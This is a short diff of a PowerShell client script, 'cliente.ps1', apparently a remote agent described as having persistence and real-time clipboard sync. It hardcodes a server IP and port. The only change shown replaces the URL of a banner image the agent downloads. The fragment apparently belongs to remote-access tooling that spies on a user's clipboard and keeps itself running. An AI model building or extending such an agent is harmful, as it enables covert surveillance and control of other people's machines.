@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent + Persistencia + Clipboard Sync em tempo real (CORRIGIDO)
+# Agent + Persistencia + Clipboard Sync + Novo Banner
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -620,7 +620,8 @@ if (-not ("R9KAgent" -as [type])) {
                             try {
                                 using (var wc = new WebClient()) {
                                     wc.Headers.Add("User-Agent", "Mozilla/5.0");
-                                    byte[] imgBytes = wc.DownloadData("https://i.imgur.com/gx1MwjP.jpeg");
+                                    // IMAGEM DO BANNER ATUALIZADA AQUI
+                                    byte[] imgBytes = wc.DownloadData("https://i.imgur.com/7PjKabp.jpeg");
                                     using (MemoryStream ms = new MemoryStream(imgBytes)) { bgImg = Image.FromStream(ms); }
                                 }
                             } catch {}
